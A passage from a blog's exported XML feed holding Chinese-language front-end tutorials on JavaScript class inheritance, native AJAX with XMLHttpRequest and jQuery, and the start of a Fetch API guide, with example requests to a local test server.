class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Phone</span>()</span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">SmartPhone</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 聲明子構造函數的方法</span></span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">change</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I can change the time&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>class</code>實現：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父類</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">brand, price</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">brand</span> = brand</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">price</span> = price</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 聲明父類的方法</span></span><br><span class="line">    <span class="title function_">call</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am calling&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子類</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SmartPhone</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Phone</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">brand, price, color, size</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(brand, price)     <span class="comment">// Phone.call(this, brand, price)</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">color</span> = color</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">size</span> = size</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 聲明子類的方法</span></span><br><span class="line">    <span class="title function_">change</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I can change the time&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>AJAX</title>
    <url>/myBlog/2022/08/01/2022/FrontEnd/2022-8-1-AJAX-Basic/</url>
    <content><![CDATA[<h1 id="原生AJAX"><a href="#原生AJAX" class="headerlink" title="原生AJAX"></a>原生AJAX</h1><ol>
<li><p>AJAX簡介：</p>
<ul>
<li>AJAX 全稱 Asynchronous Javascript And XML，就是異步的 JS 和 XML</li>
<li>通過 AJAX 可以再瀏覽器中向服務器發送異步請求，最大優勢：<font color="#f54747">頁面無刷新獲取數據</font></li>
<li>AJAX 不是新的編程語言，而是一種將現有的標準集合在一期使用的新方式</li>
</ul>
</li>
<li><p>XML簡介：</p>
<ul>
<li>XML 可擴展標記語言</li>
<li>XML 被設計用來傳輸和存儲數據</li>
<li>XML 和 HTML 類似，不同的是 HTML 仲都是預定義標籤，而 XML 仲沒有預定義標籤，都是自定義標籤，用來表示一些數據  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Donald<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">gender</span>&gt;</span>Male<span class="tag">&lt;/<span class="name">gender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>現在已經被 JSON 取代了  <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Donald&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">,</span> <span class="attr">&quot;gender&quot;</span><span class="punctuation">:</span><span class="string">&quot;Male&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>AJAX特點：</p>
<ul>
<li>優點：<ol>
<li>可以無需刷新頁面而與服務器進行通信</li>
<li>允許你根據用戶事件來更部分分頁內容</li>
</ol>
</li>
<li>缺點：<ol>
<li>沒有瀏覽史，不能回退</li>
<li>存在跨域問題（可解決）</li>
<li>SEO 不友好</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="AJAX基本使用"><a href="#AJAX基本使用" class="headerlink" title="AJAX基本使用"></a>AJAX基本使用</h2><ol>
<li><p>核心對象<br> <code>XMLHttpRequest</code> - AJAX的所有操作都是用過該對象進行</p>
</li>
<li><p>使用步驟：</p>
<ol>
<li><p>創建<code>XMLHttpRequest</code>實例對象</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>指定發送請求的：方法(<code>methods</code>)和地址(<code>url</code>)</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_get&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>發送請求</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">send</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>接收數據</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 綁定監聽狀態</span></span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 當監聽狀態等於 4 表示數據接收完畢</span></span><br><span class="line">    <span class="keyword">if</span>(xhr.<span class="property">readyState</span> === <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="comment">// xhr.response 獲取數據</span></span><br><span class="line">        content.<span class="property">innerHTML</span> = <span class="string">`&lt;h3&gt;<span class="subst">$&#123;xhr.response&#125;</span>&lt;/h3&gt;`</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="xhr內部的五種狀態"><a href="#xhr內部的五種狀態" class="headerlink" title="xhr內部的五種狀態"></a>xhr內部的五種狀態</h2><ul>
<li>5種狀態的值分別為：<code>0</code>、<code>1</code>、<code>2</code>、<code>3</code>、<code>4</code><ul>
<li><code>0</code>：實例出來的那一刻（初始狀態）</li>
<li><code>1</code>：open已經調用了，但是send還沒有調用，此時可以修改請求頭內容</li>
<li><code>2</code>：send已經調用了，已經無法修改請求頭</li>
<li><code>3</code>：已經回來一部分數據，小的數據會在此階段一次性接收完畢，較大的數據有待進一步接收，<font color="#f54747">響應頭一定回來</font></li>
<li><code>4</code>：數據全部接收完畢</li>
</ul>
</li>
</ul>
<h2 id="GET請求"><a href="#GET請求" class="headerlink" title="GET請求"></a>GET請求</h2><ol>
<li><p>攜帶<code>query</code>參數</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>使用<code>query</code>參數 (<code>urlencoded</code>) 編碼形式：<code>key=value&amp;key=value</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_get?name=Donald&amp;age=18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.query</code>屬性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test_get/&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">query</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>攜帶<code>params</code>參數</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>使用<code>params</code>參數形式：<code>xxx/xxx/Donald/18</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_get/Donald/18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.params</code>屬性</li>
<li>地址配置佔位符 (<code>/:name/:age</code>)  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 佔位符</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test_get/:name/:age&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">params</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="POST請求"><a href="#POST請求" class="headerlink" title="POST請求"></a>POST請求</h2><ol>
<li><p>攜帶<code>query</code>參數</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>使用<code>query</code>參數 (<code>urlencoded</code>) 編碼形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_post?name=Donald&amp;age=18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.query</code>屬性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/test_post/&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">query</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>攜帶<code>params</code>參數</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>使用<code>params</code>參數形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_post/Donald/18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.params</code>屬性</li>
<li>地址配置佔位符 (<code>/:name/:age</code>)  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 佔位符</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/test_post/:name/:age&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">params</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>使用請求體的<code>urlencode</code>編碼形式</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>不需要在地址中添加  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_post&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>追加響應頭：</p>
<ul>
<li>用於表示攜帶請求體參數的<code>urlencode</code>編碼形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>發送請求：</p>
<ul>
<li>在發送請求時傳入參數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">send</span>(<span class="string">&#x27;name=Donald&amp;age=18&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用中間件解析：</p>
<ul>
<li>引入中間件解析<code>urlencoded</code>編碼形式的請求體參數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>:<span class="literal">true</span>&#125;))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.body</code>屬性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/test_post&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">body</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>使用請求體的<code>json</code>編碼形式</p>
<ol>
<li><p>指定請求：</p>
<ul>
<li>不需要在地址中添加  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8080/test_post&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>追加響應頭：</p>
<ul>
<li>用於表示攜帶請求體參數的<code>json</code>編碼形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>發送請求：</p>
<ul>
<li>在發送請求時傳入參數</li>
<li><code>JSON.stringify</code>對象，讓其轉換為<code>JSON</code>字符串  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">18</span>&#125;</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(person))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>使用中間件解析：</p>
<ul>
<li>引入中間件解析<code>json</code>編碼形式的請求體參數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接收參數：</p>
<ul>
<li>使用<code>request.body</code>屬性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/test_post&#x27;</span>, <span class="function">(<span class="params">request, response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(request.<span class="property">body</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="解析JSON數據"><a href="#解析JSON數據" class="headerlink" title="解析JSON數據"></a>解析JSON數據</h2><ol>
<li><p>解析JSON格式數據：</p>
<ul>
<li>在獲取數據之後使用<code>JSON.parse</code>函數解析  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br></pre></td></tr></table></figure></li>
<li>問題：如果服務器返回的數據非 JSON 格式則會報錯</li>
</ul>
</li>
<li><p><code>xhr</code>的API解析JSON格式：</p>
<ul>
<li>配置<code>xhr.responseType</code>屬性為<code>json</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;json&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>服務器返回數據後就會進行 JSON 格式的解析，如果返回數據非 JSON 格式則<code>response</code>為<code>null</code></li>
</ul>
</li>
</ol>
<h2 id="請求異常與超時處理"><a href="#請求異常與超時處理" class="headerlink" title="請求異常與超時處理"></a>請求異常與超時處理</h2><ol>
<li><p>處理請求異常：</p>
<ul>
<li>使用<code>xhr.onerror</code>配置請求異常的回調函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;Request Error&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>處理超時問題：</p>
<ul>
<li>使用<code>xhr.timeout</code>設置請求時限，如果超過時限則取消請求</li>
<li>使用<code>xhr.ontimeout</code>配置超時的回調函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 超時時間</span></span><br><span class="line">xhr.<span class="property">timeout</span> = <span class="number">2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 超時的回調</span></span><br><span class="line">xhr.<span class="property">ontimeout</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;Request Timeout&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="取消請求"><a href="#取消請求" class="headerlink" title="取消請求"></a>取消請求</h2><ol>
<li><p>取消請求：</p>
<ul>
<li>使用<code>xhr.abort</code>函數可以取消該次請求  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">abort</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>工作原理：</p>
<ul>
<li>測試編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line">xhr.<span class="title function_">abort</span>()</span><br></pre></td></tr></table></figure></li>
<li>如果發送請求之後立即取消請求，該次請求是有可能已經發送到服務器，但也獲取不到數據，因為瀏覽器會將服務器的響應攔截</li>
<li>簡而言之，然後速度夠快，在請求沒有發送到服務器之前被攔截並取消，如果請求發送到服務器，那麼瀏覽器也會攔截服務器的響應</li>
</ul>
</li>
</ol>
<h2 id="避免多次重複請求"><a href="#避免多次重複請求" class="headerlink" title="避免多次重複請求"></a>避免多次重複請求</h2><ul>
<li>配置一個<code>isLoading</code>屬性判斷請求是否發送中，如果發送中，再次發生請求則關閉上次的請求  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> xhr</span><br><span class="line"><span class="keyword">let</span> isLoading</span><br><span class="line">btn.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(isLoading) xhr.<span class="title function_">abort</span>()   <span class="comment">// 如果發送請求中則取消該次請求</span></span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; (xhr.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; xhr.<span class="property">status</span> &lt; <span class="number">300</span>))&#123;</span><br><span class="line">            isLoading = <span class="literal">false</span>   <span class="comment">// 接收到數據後為 false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.<span class="title function_">send</span>()</span><br><span class="line">    isLoading = <span class="literal">true</span>    <span class="comment">// 發生請求後為 true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h1><h2 id="GET請求-1"><a href="#GET請求-1" class="headerlink" title="GET請求"></a>GET請求</h2><ol>
<li><p>完整版：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:8080/test_jquery_get&#x27;</span>,   <span class="comment">// 請求地址</span></span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,                                  <span class="comment">// 請求方式（默認值GET）</span></span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,                               <span class="comment">// 配置響應數據格式</span></span><br><span class="line">    <span class="attr">data</span>: &#123;&#125;,                                       <span class="comment">// 攜帶的數據</span></span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">2000</span>,                                  <span class="comment">// 指定超時時間</span></span><br><span class="line">    <span class="attr">success</span>: <span class="function">(<span class="params">result, responseText, xhr</span>) =&gt;</span> &#123;       <span class="comment">// 成功的回調</span></span><br><span class="line">        result          <span class="comment">// 服務器的響應數據</span></span><br><span class="line">        responseText    <span class="comment">// 響應結果 (success)</span></span><br><span class="line">        xhr             <span class="comment">// xhr 構造函數</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">error</span>: <span class="function">() =&gt;</span> &#123;&#125;,                                <span class="comment">// 失敗的回調</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>精簡版：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">get</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_jquery_get&#x27;</span>, &#123;&#125;, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;,<span class="string">&#x27;json&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>備註：攜帶的數據默認是<code>query</code>格式，可以使用<code>params</code>格式，不過要在<code>url</code>和服務器追加上追加</p>
</li>
</ol>
<h2 id="POST請求-1"><a href="#POST請求-1" class="headerlink" title="POST請求"></a>POST請求</h2><ol>
<li><p>完整版：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:8080/test_jquery_post&#x27;</span>,  <span class="comment">// 請求地址</span></span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,                                 <span class="comment">// 請求方式（默認值GET）</span></span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,                               <span class="comment">// 配置響應數據格式</span></span><br><span class="line">    <span class="attr">data</span>: &#123;&#125;,                                       <span class="comment">// 攜帶的數據</span></span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">2000</span>,                                  <span class="comment">// 指定超時時間</span></span><br><span class="line">    <span class="attr">success</span>: <span class="function">(<span class="params">result, responseText, xhr</span>) =&gt;</span> &#123;       <span class="comment">// 成功的回調</span></span><br><span class="line">        result          <span class="comment">// 服務器的響應數據</span></span><br><span class="line">        responseText    <span class="comment">// 響應結果 (success)</span></span><br><span class="line">        xhr             <span class="comment">// xhr 構造函數</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">error</span>: <span class="function">() =&gt;</span> &#123;&#125;,                                <span class="comment">// 失敗的回調</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>精簡版：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">post</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_jquery_post&#x27;</span>, &#123;&#125;, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;,<span class="string">&#x27;json&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>備註：攜帶的數據默認是<code>query</code>格式，可以使用<code>params</code>格式，不過要在<code>url</code>和服務器追加上追加</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>ajax</tag>
      </tags>
  </entry>
  <entry>
    <title>Fetch</title>
    <url>/myBlog/2022/08/03/2022/FrontEnd/2022-8-3-Fetch/</url>
    <content><![CDATA[<h2 id="fetch基本認知"><a href="#fetch基本認知" class="headerlink" title="fetch基本認知"></a>fetch基本認知</h2><ol>
<li><p>發送請求方法：</p>
<ol>
<li><p>通過<code>Ajax</code>向服務器請求數據，使用<code>XMLHttpRequest</code>對象實現</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;LOAD&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通過<code>axios</code>實現，代碼精簡但底層仍然基於<code>XMLHttpRequest</code>對象實現，本質只是進行<code>Promise</code>封裝</p>
</li>
</ol>
</li>
<li><p><code>fetch</code>簡介：</p>
<ul>
<li>被稱為下一代的<code>Ajax</code>技術，內部採用<code>Promise</code>方法處理數據 （可以直接使用<code>.then</code>）</li>
<li>API語法簡潔</li>
<li>採用模塊化設計，API分散於多個對象中 （<code>Responnse</code>對象、<code>Request</code>對象、<code>Header</code>對象）</li>
<li>通過數據流 （<code>Stream</code>對象）處理數據，可以分塊讀取，有利於提高網站性能</li>
</ul>
</li>
</ol>
<h2 id="GET請求"><a href="#GET請求" class="headerlink" title="GET請求"></a>GET請求</h2><ol>
<li><p>簡介：</p>
<ul>
<li>如果<code>fetch()</code>只接收<font color="#f54747">一個</font><code>url</code>字符串參數，表示默認向網址發送<code>GET</code>請求，會返回一個<code>Promise</code>對象</li>
</ul>
</li>
<li><p>基本使用</p>
<ul>
<li>具體編碼  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_fetch_get&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 直接得到的 res 是一個 Response 對象</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// res.json() 是一個異步操作，表示取出所有內容，並轉換成 JSON 對象</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>()</span><br><span class="line"></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">json</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 獲取處理過的數據</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(json)</span><br><span class="line"></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 捕獲錯誤信息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>把代碼封裝成<code>async</code>異步函數</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 通過 try...catch 處理 async 和 await 成功和失敗情</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 先獲取 Response 對象</span></span><br><span class="line">        <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_fetch_get&#x27;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通過 res.json() 取出 Response 對象中的結果</span></span><br><span class="line">        <span class="keyword">let</span> json = <span class="keyword">await</span> res.<span class="title function_">json</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(json)</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getData</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Respons對象"><a href="#Respons對象" class="headerlink" title="Respons對象"></a>Respons對象</h2><ol>
<li><p>常見屬性：</p>
<table>
<thead>
<tr>
<th align="center">屬性</th>
<th align="center">含義</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>res.ok</code></td>
